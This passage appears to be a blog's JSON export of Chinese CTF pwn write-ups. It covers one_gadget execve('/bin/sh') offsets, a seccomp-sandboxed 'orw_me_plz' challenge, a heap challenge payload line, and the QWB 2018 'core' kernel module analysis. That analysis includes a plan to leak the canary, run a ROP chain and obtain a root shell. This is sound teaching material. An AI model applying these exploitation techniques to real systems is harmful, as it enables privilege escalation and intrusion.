== NULL</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 0xe3b01 execve(&quot;/bin/sh&quot;, r15, rdx)</span></span><br><span class=\"line\"><span class=\"comment\"># constraints:</span></span><br><span class=\"line\"><span class=\"comment\">#   [r15] == NULL || r15 == NULL</span></span><br><span class=\"line\"><span class=\"comment\">#   [rdx] == NULL || rdx == NULL</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 0xe3b04 execve(&quot;/bin/sh&quot;, rsi, rdx)</span></span><br><span class=\"line\"><span class=\"comment\"># constraints:</span></span><br><span class=\"line\"><span class=\"comment\">#   [rsi] == NULL || rsi == NULL</span></span><br><span class=\"line\"><span class=\"comment\">#   [rdx] == NULL || rdx == NULL</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>"},{"title":"orw_me_plz","date":"2023-03-19T13:09:15.000Z","_content":"\nNewStar CTF Week5的题，\n\n<!--more-->\n\n查壳，保护全开\n\n```sh\n[*] '/home/a1ph0nse/PwnPractice/CtfGame/NewStar/orw_me_plz/pwn'\n    Arch:     amd64-64-little\n    RELRO:    Full RELRO\n    Stack:    Canary found\n    NX:       NX enabled\n    PIE:      PIE enabled\n```\n\n有沙箱\n\n```sh\n line  CODE  JT   JF      K\n=================================\n 0000: 0x20 0x00 0x00 0x00000004  A = arch\n 0001: 0x15 0x00 0x0a 0xc000003e  if (A != ARCH_X86_64) goto 0012\n 0002: 0x20 0x00 0x00 0x00000000  A = sys_number\n 0003: 0x35 0x08 0x00 0x40000000  if (A >= 0x40000000) goto 0012\n 0004: 0x15 0x07 0x00 0x00000002  if (A == open) goto 0012\n 0005: 0x15 0x06 0x00 0x0000009d  if (A == prctl) goto 0012\n 0006: 0x15 0x05 0x00 0x00000039  if (A == fork) goto 0012\n 0007: 0x15 0x04 0x00 0x0000003a  if (A == vfork) goto 0012\n 0008: 0x15 0x03 0x00 0x0000003b  if (A == execve) goto 0012\n 0009: 0x15 0x02 0x00 0x00000065  if (A == ptrace) goto 0012\n 0010: 0x15 0x01 0x00 0x00000142  if (A == execveat) goto 0012\n 0011: 0x06 0x00 0x00 0x7fff0000  return ALLOW\n 0012: 0x06 0x00 0x00 0x00000000  return KILL\n```\n\nban掉了`open`和`exec`。\n\n和leak_me_plz有点类似，先给一个libc地址计算libcbase，之后输入一个地址，向该地址写入0x10字节的内容。\n\n```c\nvoid __noreturn vuln()\n{\n  void *buf[2]; // [rsp+0h] [rbp-10h] BYREF\n\n  buf[1] = (void *)__readfsqword(0x28u);\n  buf[0] = 0LL;\n  puts(\"This time you need to orw.\");\n  printf(\"Here is your gift: %p\\nGood luck!\\n\", &puts);\n  printf(\"Addr: \");\n  read(0, buf, 8uLL);\n  printf(\"Data: \");\n  read(0, buf[0], 0x10uLL);\n  puts(\"Did you get that?\");\n  exit(0);\n}\n```\n\n\n\n","source":"_posts/NewStar-orw_me_plz.md","raw":"---\ntitle: orw_me_plz\ndate: 2023-03-19 21:09:15\ncategories: \n- pwn_wp\ntags: \n- pwn\n- ROP\n- 栈迁移\n\n\n---\n\nNewStar CTF Week5的题，\n\n<!--more-->\n\n查壳，保护全开\n\n```sh\n[*] '/home/a1ph0nse/PwnPractice/CtfGame/NewStar/orw_me_plz/pwn'\n    Arch:     amd64-64-little\n    RELRO:    Full RELRO\n    Stack:    Canary found\n    NX:       NX enabled\n    PIE:      PIE enabled\n```\n\n有沙箱\n\n```sh\n line  CODE  JT   JF      K\n=================================\n 0000: 0x20 0x00 0x00 0x00000004  A = arch\n 0001: 0x15 0x00 0x0a 0xc000003e  if (A != ARCH_X86_64) goto 0012\n 0002: 0x20 0x00 0x00 0x00000000  A = sys_number\n 0003: 0x35 0x08 0x00 0x40000000  if (A >= 0x40000000) goto 0012\n 0004: 0x15 0x07 0x00 0x00000002  if (A == open) goto 0012\n 0005: 0x15 0x06 0x00 0x0000009d  if (A == prctl) goto 0012\n 0006: 0x15 0x05 0x00 0x00000039  if (A == fork) goto 0012\n 0007: 0x15 0x04 0x00 0x0000003a  if (A == vfork) goto 0012\n 0008: 0x15 0x03 0x00 0x0000003b  if (A == execve) goto 0012\n 0009: 0x15 0x02 0x00 0x00000065  if (A == ptrace) goto 0012\n 0010: 0x15 0x01 0x00 0x00000142  if (A == execveat) goto 0012\n 0011: 0x06 0x00 0x00 0x7fff0000  return ALLOW\n 0012: 0x06 0x00 0x00 0x00000000  return KILL\n```\n\nban掉了`open`和`exec`。\n\n和leak_me_plz有点类似，先给一个libc地址计算libcbase，之后输入一个地址，向该地址写入0x10字节的内容。\n\n```c\nvoid __noreturn vuln()\n{\n  void *buf[2]; // [rsp+0h] [rbp-10h] BYREF\n\n  buf[1] = (void *)__readfsqword(0x28u);\n  buf[0] = 0LL;\n  puts(\"This time you need to orw.\");\n  printf(\"Here is your gift: %p\\nGood luck!\\n\", &puts);\n  printf(\"Addr: \");\n  read(0, buf, 8uLL);\n  printf(\"Data: \");\n  read(0, buf[0], 0x10uLL);\n  puts(\"Did you get that?\");\n  exit(0);\n}\n```\n\n\n\n","slug":"NewStar-orw_me_plz","published":1,"updated":"2023-03-19T13:16:16.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clg9czafh001r5oudfa996lez","content":"<p>NewStar CTF Week5的题，</p>\n<span id=\"more\"></span>\n\n<p>查壳，保护全开</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[*] <span class=\"string\">&#x27;/home/a1ph0nse/PwnPractice/CtfGame/NewStar/orw_me_plz/pwn&#x27;</span></span><br><span class=\"line\">    Arch:     amd64-64-little</span><br><span class=\"line\">    RELRO:    Full RELRO</span><br><span class=\"line\">    Stack:    Canary found</span><br><span class=\"line\">    NX:       NX enabled</span><br><span class=\"line\">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>\n\n<p>有沙箱</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> line  CODE  JT   JF      K</span><br><span class=\"line\">=================================</span><br><span class=\"line\"> 0000: 0x20 0x00 0x00 0x00000004  A = <span class=\"built_in\">arch</span></span><br><span class=\"line\"> 0001: 0x15 0x00 0x0a 0xc000003e  <span class=\"keyword\">if</span> (A != ARCH_X86_64) goto 0012</span><br><span class=\"line\"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class=\"line\"> 0003: 0x35 0x08 0x00 0x40000000  <span class=\"keyword\">if</span> (A &gt;= 0x40000000) goto 0012</span><br><span class=\"line\"> 0004: 0x15 0x07 0x00 0x00000002  <span class=\"keyword\">if</span> (A == open) goto 0012</span><br><span class=\"line\"> 0005: 0x15 0x06 0x00 0x0000009d  <span class=\"keyword\">if</span> (A == prctl) goto 0012</span><br><span class=\"line\"> 0006: 0x15 0x05 0x00 0x00000039  <span class=\"keyword\">if</span> (A == fork) goto 0012</span><br><span class=\"line\"> 0007: 0x15 0x04 0x00 0x0000003a  <span class=\"keyword\">if</span> (A == vfork) goto 0012</span><br><span class=\"line\"> 0008: 0x15 0x03 0x00 0x0000003b  <span class=\"keyword\">if</span> (A == execve) goto 0012</span><br><span class=\"line\"> 0009: 0x15 0x02 0x00 0x00000065  <span class=\"keyword\">if</span> (A == ptrace) goto 0012</span><br><span class=\"line\"> 0010: 0x15 0x01 0x00 0x00000142  <span class=\"keyword\">if</span> (A == execveat) goto 0012</span><br><span class=\"line\"> 0011: 0x06 0x00 0x00 0x7fff0000  <span class=\"built_in\">return</span> ALLOW</span><br><span class=\"line\"> 0012: 0x06 0x00 0x00 0x00000000  <span class=\"built_in\">return</span> KILL</span><br></pre></td></tr></table></figure>\n\n<p>ban掉了<code>open</code>和<code>exec</code>。</p>\n<p>和leak_me_plz有点类似，先给一个libc地址计算libcbase，之后输入一个地址，向该地址写入0x10字节的内容。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">void</span> __noreturn <span class=\"title function_\">vuln</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">void</span> *buf[<span class=\"number\">2</span>]; <span class=\"comment\">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class=\"line\"></span><br><span class=\"line\">  buf[<span class=\"number\">1</span>] = (<span class=\"type\">void</span> *)__readfsqword(<span class=\"number\">0x28</span>u);</span><br><span class=\"line\">  buf[<span class=\"number\">0</span>] = <span class=\"number\">0LL</span>;</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;This time you need to orw.&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Here is your gift: %p\\nGood luck!\\n&quot;</span>, &amp;<span class=\"built_in\">puts</span>);</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Addr: &quot;</span>);</span><br><span class=\"line\">  read(<span class=\"number\">0</span>, buf, <span class=\"number\">8uLL</span>);</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Data: &quot;</span>);</span><br><span class=\"line\">  read(<span class=\"number\">0</span>, buf[<span class=\"number\">0</span>], <span class=\"number\">0x10</span>uLL);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Did you get that?&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">exit</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n","site":{"data":{}},"excerpt":"<p>NewStar CTF Week5的题，</p>","more":"<p>查壳，保护全开</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[*] <span class=\"string\">&#x27;/home/a1ph0nse/PwnPractice/CtfGame/NewStar/orw_me_plz/pwn&#x27;</span></span><br><span class=\"line\">    Arch:     amd64-64-little</span><br><span class=\"line\">    RELRO:    Full RELRO</span><br><span class=\"line\">    Stack:    Canary found</span><br><span class=\"line\">    NX:       NX enabled</span><br><span class=\"line\">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>\n\n<p>有沙箱</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> line  CODE  JT   JF      K</span><br><span class=\"line\">=================================</span><br><span class=\"line\"> 0000: 0x20 0x00 0x00 0x00000004  A = <span class=\"built_in\">arch</span></span><br><span class=\"line\"> 0001: 0x15 0x00 0x0a 0xc000003e  <span class=\"keyword\">if</span> (A != ARCH_X86_64) goto 0012</span><br><span class=\"line\"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class=\"line\"> 0003: 0x35 0x08 0x00 0x40000000  <span class=\"keyword\">if</span> (A &gt;= 0x40000000) goto 0012</span><br><span class=\"line\"> 0004: 0x15 0x07 0x00 0x00000002  <span class=\"keyword\">if</span> (A == open) goto 0012</span><br><span class=\"line\"> 0005: 0x15 0x06 0x00 0x0000009d  <span class=\"keyword\">if</span> (A == prctl) goto 0012</span><br><span class=\"line\"> 0006: 0x15 0x05 0x00 0x00000039  <span class=\"keyword\">if</span> (A == fork) goto 0012</span><br><span class=\"line\"> 0007: 0x15 0x04 0x00 0x0000003a  <span class=\"keyword\">if</span> (A == vfork) goto 0012</span><br><span class=\"line\"> 0008: 0x15 0x03 0x00 0x0000003b  <span class=\"keyword\">if</span> (A == execve) goto 0012</span><br><span class=\"line\"> 0009: 0x15 0x02 0x00 0x00000065  <span class=\"keyword\">if</span> (A == ptrace) goto 0012</span><br><span class=\"line\"> 0010: 0x15 0x01 0x00 0x00000142  <span class=\"keyword\">if</span> (A == execveat) goto 0012</span><br><span class=\"line\"> 0011: 0x06 0x00 0x00 0x7fff0000  <span class=\"built_in\">return</span> ALLOW</span><br><span class=\"line\"> 0012: 0x06 0x00 0x00 0x00000000  <span class=\"built_in\">return</span> KILL</span><br></pre></td></tr></table></figure>\n\n<p>ban掉了<code>open</code>和<code>exec</code>。</p>\n<p>和leak_me_plz有点类似，先给一个libc地址计算libcbase，之后输入一个地址，向该地址写入0x10字节的内容。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">void</span> __noreturn <span class=\"title function_\">vuln</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">void</span> *buf[<span class=\"number\">2</span>]; <span class=\"comment\">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class=\"line\"></span><br><span class=\"line\">  buf[<span class=\"number\">1</span>] = (<span class=\"type\">void</span> *)__readfsqword(<span class=\"number\">0x28</span>u);</span><br><span class=\"line\">  buf[<span class=\"number\">0</span>] = <span class=\"number\">0LL</span>;</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;This time you need to orw.&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Here is your gift: %p\\nGood luck!\\n&quot;</span>, &amp;<span class=\"built_in\">puts</span>);</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Addr: &quot;</span>);</span><br><span class=\"line\">  read(<span class=\"number\">0</span>, buf, <span class=\"number\">8uLL</span>);</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Data: &quot;</span>);</span><br><span class=\"line\">  read(<span class=\"number\">0</span>, buf[<span class=\"number\">0</span>], <span class=\"number\">0x10</span>uLL);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Did you get that?&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">exit</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>"},{"title":"QWNT-webheap","date":"2023-03-20T06:05:16.000Z","_content":"\n强网拟态，C++ pwn\n\n<!-- more -->\n\n\n\n```c\nstruct note{\n    QWORD choose;\n    QWORD idx;\n    QWORD size;\n    QWORD* content;\n}\n```\n\n\n\n\n\n```py\npayload=p8(0xb9)+p8(0x5)+p8(choose_type)+pxx(choose)+p8(idx_type)+pxx(idx)+p8(0xBD)+p8(size_type)+pxx(len(content))+content\n\n# idx size\n# 1byte:0x80\n# 2byte:0x81\n# 4byte:0x82\n# 8byte:0x83\n\n# choose \n# 1byte:0x84\n# 2byte:0x85\n# 4byte:0x86\n\n\n\n\n```\n\n","source":"_posts/QWNT-webheap.md","raw":"---\ntitle: QWNT-webheap\ndate: 2023-03-20 14:05:16\ncategories: \n- pwn_wp\ntags: \n- pwn\n- heap\n\n\n---\n\n强网拟态，C++ pwn\n\n<!-- more -->\n\n\n\n```c\nstruct note{\n    QWORD choose;\n    QWORD idx;\n    QWORD size;\n    QWORD* content;\n}\n```\n\n\n\n\n\n```py\npayload=p8(0xb9)+p8(0x5)+p8(choose_type)+pxx(choose)+p8(idx_type)+pxx(idx)+p8(0xBD)+p8(size_type)+pxx(len(content))+content\n\n# idx size\n# 1byte:0x80\n# 2byte:0x81\n# 4byte:0x82\n# 8byte:0x83\n\n# choose \n# 1byte:0x84\n# 2byte:0x85\n# 4byte:0x86\n\n\n\n\n```\n\n","slug":"QWNT-webheap","published":1,"updated":"2023-03-21T07:25:46.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clg9czafi001u5oudbi6a5270","content":"<p>强网拟态，C++ pwn</p>\n<span id=\"more\"></span>\n\n\n\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">note</span>&#123;</span></span><br><span class=\"line\">    QWORD choose;</span><br><span class=\"line\">    QWORD idx;</span><br><span class=\"line\">    QWORD size;</span><br><span class=\"line\">    QWORD* content;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n<figure class=\"highlight py\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">payload=p8(<span class=\"number\">0xb9</span>)+p8(<span class=\"number\">0x5</span>)+p8(choose_type)+pxx(choose)+p8(idx_type)+pxx(idx)+p8(<span class=\"number\">0xBD</span>)+p8(size_type)+pxx(<span class=\"built_in\">len</span>(content))+content</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># idx size</span></span><br><span class=\"line\"><span class=\"comment\"># 1byte:0x80</span></span><br><span class=\"line\"><span class=\"comment\"># 2byte:0x81</span></span><br><span class=\"line\"><span class=\"comment\"># 4byte:0x82</span></span><br><span class=\"line\"><span class=\"comment\"># 8byte:0x83</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># choose </span></span><br><span class=\"line\"><span class=\"comment\"># 1byte:0x84</span></span><br><span class=\"line\"><span class=\"comment\"># 2byte:0x85</span></span><br><span class=\"line\"><span class=\"comment\"># 4byte:0x86</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n","site":{"data":{}},"excerpt":"<p>强网拟态，C++ pwn</p>","more":"<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">note</span>&#123;</span></span><br><span class=\"line\">    QWORD choose;</span><br><span class=\"line\">    QWORD idx;</span><br><span class=\"line\">    QWORD size;</span><br><span class=\"line\">    QWORD* content;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n<figure class=\"highlight py\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">payload=p8(<span class=\"number\">0xb9</span>)+p8(<span class=\"number\">0x5</span>)+p8(choose_type)+pxx(choose)+p8(idx_type)+pxx(idx)+p8(<span class=\"number\">0xBD</span>)+p8(size_type)+pxx(<span class=\"built_in\">len</span>(content))+content</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># idx size</span></span><br><span class=\"line\"><span class=\"comment\"># 1byte:0x80</span></span><br><span class=\"line\"><span class=\"comment\"># 2byte:0x81</span></span><br><span class=\"line\"><span class=\"comment\"># 4byte:0x82</span></span><br><span class=\"line\"><span class=\"comment\"># 8byte:0x83</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># choose </span></span><br><span class=\"line\"><span class=\"comment\"># 1byte:0x84</span></span><br><span class=\"line\"><span class=\"comment\"># 2byte:0x85</span></span><br><span class=\"line\"><span class=\"comment\"># 4byte:0x86</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>"},{"title":"QWB_core","date":"2023-03-14T02:33:40.000Z","_content":"\n强网杯2018 core，从0到1的kernel。\n\n<!--more-->\n\n### 分析\n\n首先分析启动脚本`start.sh`\n\n```sh\nqemu-system-x86_64 \\\t# x86_64架构\n-m 64M \\\t# 分配64M内存\n-kernel ./bzImage \\\t\t# 使用bzImage作为内存镜像(kernel)\t\n-initrd  ./core.cpio \\\t# 使用core.cpio作为磁盘镜像(文件系统)\n-append \"root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet kaslr\" \\ # 设置root，指定终端为tty50，开启kaslr\n-s  \\\t# 启动后qemu不立即运行guest，而是等待主机gdb发起连接，使用1234端口\n-netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \\     # 网络配置\n-nographic  \\\t\t# 非图形化启动，使用命令行\n```\n\n解压``core.cpio`，查看`init`文件（初始化的过程）：\n\n```sh\n#!/bin/sh\n# 挂载文件系统\nmount -t proc proc /proc\nmount -t sysfs sysfs /sys\nmount -t devtmpfs none /dev\n/sbin/mdev -s\nmkdir -p /dev/pts\nmount -vt devpts -o gid=4,mode=620 none /dev/pts\nchmod 666 /dev/ptmx\n# 复制了一份符号表\ncat /proc/kallsyms > /tmp/kallsyms\necho 1 > /proc/sys/kernel/kptr_restrict\necho 1 > /proc/sys/kernel/dmesg_restrict\n# 网络配置\nifconfig eth0 up\nudhcpc -i eth0\nifconfig eth0 10.0.2.15 netmask 255.255.255.0\nroute add default gw 10.0.2.2 \n# 加载了core.ko模块\ninsmod /core.ko\n\n#定时关机\npoweroff -d 120 -f &\nsetsid /bin/cttyhack setuidgid 1000 /bin/sh\necho 'sh end!\\n'\numount /proc\numount /sys\n\npoweroff -d 0  -f\n```\n\nchecksec一下`core.ko`:\n\n```sh\n[*] '/home/a1ph0nse/PwnPractice/OwnTrain/StrongWeb2018core/core_give/give_to_player/core/core.ko'\n    Arch:     amd64-64-little\n    RELRO:    No RELRO\n    Stack:    Canary found\n    NX:       NX enabled\n```\n\n扔到IDA逆一下，`init_module`是这个模块的初始化工作：\n\n```c\n__int64 init_module()\n{\n  core_proc = proc_create(\"core\", 0666LL, 0LL, &core_fops);\n  printk(&unk_2DE);\n  return 0LL;\n}\n```\n\n这个模块一开始就会创建一个自己的进程，使用的是`core_fops`。\n\n```c\nstatic inline struct proc_dir_entry *proc_create(const char *name, mode_t mode, struct proc_dir_entry *parent, const struct file_operations *proc_fops);\n```\n\n- name就是要创建的文件名。\n- **mode是文件的访问权限，以UGO的模式表示。**\n    - UGO：使用三组字符串(或数字)表示属用户，属组和其他用户的rwx权限：r=4,w=2,x=1(因此777就是rwxrwxrwx)\n- **parent与proc_mkdir中的parent类似。也是父文件夹的proc_dir_entry对象**。\n- proc_fops就是该文件的操作函数了。\n\n```asm\n.data:0000000000000420 40 05 00 00 00 00 00 00       core_fops dq offset __this_module       ; DATA XREF: init_module↑o\n.data:0000000000000428 00 00 00 00 00 00 00 00       dq 0\n.data:0000000000000430 00 00 00 00 00 00 00 00       dq 0\n.data:0000000000000438 11 00 00 00 00 00 00 00       dq offset core_write\n.data:0000000000000440 00 00 00 00 00 00 00 00       dq 0\n.data:0000000000000448 00 00 00 00 00 00 00 00       dq 0\n.data:0000000000000450 00 00 00 00 00 00 00 00       dq 0\n.data:0000000000000458 00 00 00 00 00 00 00 00       dq 0\n.data:0000000000000460 00 00 00 00 00 00 00 00       dq 0\n.data:0000000000000468 5F 01 00 00 00 00 00 00       dq offset core_ioctl\n```\n\n`core_fops`中有`core_write`、`core_ioctl`和`core_release`三个函数。\n\n`core_release`仅输出一段字符串，没有利用价值。\n\n`core_write`会将一段用户空间的数据(最多0x800byte)，写入`bss`的`name`处。\n\n`core_ioctl`会根据请求码选择不同的操作，可以调用`core_read`将栈上偏移`off`的数据写入用户空间，可以设置`off`，也可以调用`core_copy_func`。\n\n在`core_copy_func`会将`bss`中的`name`复制到栈上，其中有一个**整数溢出**，可以通过**负数**绕过检查并实现栈溢出。\n\n补充一下相关的内容：`core_fops`是一个`file_operations`的结构体，通过覆盖其中的内容来修改用户层调用时，该内核模块中执行的函数。\n\n```c\nstruct file_operations {\n\tstruct module *owner;\n\tloff_t (*llseek) (struct file *, loff_t, int);\n\tssize_t (*read) (struct file *, char __user *, size_t, loff_t *);\n\tssize_t (*write) (struct file *, const char __user *, size_t, loff_t *);\n\tssize_t (*read_iter) (struct kiocb *, struct iov_iter *);\n\tssize_t (*write_iter) (struct kiocb *, struct iov_iter *);\n\tint (*iopoll)(struct kiocb *kiocb, struct io_comp_batch *,\n\t\t\tunsigned int flags);\n\tint (*iterate) (struct file *, struct dir_context *);\n\tint (*iterate_shared) (struct file *, struct dir_context *);\n\t__poll_t (*poll) (struct file *, struct poll_table_struct *);\n\tlong (*unlocked_ioctl) (struct file *, unsigned int, unsigned long);\n\tlong (*compat_ioctl) (struct file *, unsigned int, unsigned long);\n\tint (*mmap) (struct file *, struct vm_area_struct *);\n\tunsigned long mmap_supported_flags;\n\tint (*open) (struct inode *, struct file *);\n\tint (*flush) (struct file *, fl_owner_t id);\n\tint (*release) (struct inode *, struct file *);\n\tint (*fsync) (struct file *, loff_t, loff_t, int datasync);\n\tint (*fasync) (int, struct file *, int);\n\tint (*lock) (struct file *, int, struct file_lock *);\n\tssize_t (*sendpage) (struct file *, struct page *, int, size_t, loff_t *, int);\n\tunsigned long (*get_unmapped_area)(struct file *, unsigned long, unsigned long, unsigned long, unsigned long);\n\tint (*check_flags)(int);\n\tint (*flock) (struct file *, int, struct file_lock *);\n\tssize_t (*splice_write)(struct pipe_inode_info *, struct file *, loff_t *, size_t, unsigned int);\n\tssize_t (*splice_read)(struct file *, loff_t *, struct pipe_inode_info *, size_t, unsigned int);\n\tint (*setlease)(struct file *, long, struct file_lock **, void **);\n\tlong (*fallocate)(struct file *file, int mode, loff_t offset,\n\t\t\t  loff_t len);\n\tvoid (*show_fdinfo)(struct seq_file *m, struct file *f);\n#ifndef CONFIG_MMU\n\tunsigned (*mmap_capabilities)(struct file *);\n#endif\n\tssize_t (*copy_file_range)(struct file *, loff_t, struct file *,\n\t\t\tloff_t, size_t, unsigned int);\n\tloff_t (*remap_file_range)(struct file *file_in, loff_t pos_in,\n\t\t\t\t   struct file *file_out, loff_t pos_out,\n\t\t\t\t   loff_t len, unsigned int remap_flags);\n\tint (*fadvise)(struct file *, loff_t, loff_t, int);\n} __randomize_layout;\n```\n\n在`core_fops`中修改了内核中`write`的指向，在用户层调用`write`函数最终就会调用到这个内核模块中定义的`core_write`。\n\n经过上面的分析，我们可以有一个大概的思路：\n\n`查找关键函数地址计算偏移 --> 利用core_read泄露Canary--> 在name中构建ROP chain --> 利用core_copy_func的栈溢出执行ROP链 --> 获取root权限并返回用户态获取root shell`\n\n### 坑\n\n#### 对抗KASLR\n\n在`start.sh`中就可以看到，这道题开启了`KASLR`保护，这和`ASLR`是类似的，都是一种地址随机化技术，我们可以在获取地址后**计算偏移**来绕过。但对于没有相关经验的我来说，怎么计算偏移是一个问题，查阅资料后发现，这需要利用到vmlinux文件。\n\n在linux系统中，vmlinux（vmlinuz）是一个包含linux kernel的**静态链接的可执行文件**，文件类型可能是linux接受的可执行文件格式之一（ELF、COFF或a.out），vmlinux若要用于调试时则必须要在引导前增加symbol table\n\n**应用场景：**\n\n- 用于调试，但需要包含调试信息\n- 编译出来的内核原始文件，可以被用来制作后面zImage，bzImage等启动Image\n- UBoot不能直接使用vmlinux\n\n**相关内容：**\n\n- vmlinux是ELF文件。是编译出来的最原始的文件\n- 